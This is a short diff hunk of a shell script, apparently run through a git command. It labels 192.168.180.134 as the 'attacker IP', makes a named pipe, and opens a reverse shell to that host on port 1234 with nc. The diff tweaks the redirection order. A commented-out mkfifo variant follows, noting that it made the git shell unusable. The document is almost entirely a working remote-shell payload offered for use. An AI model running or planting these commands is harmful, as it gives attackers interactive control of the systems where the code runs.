@@ -3,7 +3,7 @@ touch HelloWorld
 #attacker IP:192.168.180.134
 #work
 rm /tmp/backpipe ; mknod /tmp/backpipe p
-/bin/sh 0</tmp/backpipe | nc 192.168.180.134 1234 1>/tmp/backpipe 2>&1 &
+/bin/sh 0</tmp/backpipe | nc 192.168.180.134 1234 2>&1 1>/tmp/backpipe &
 
 #work --- but can not use the shell any more which executed the git command.
 #rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.180.134 1234 >/tmp/f&
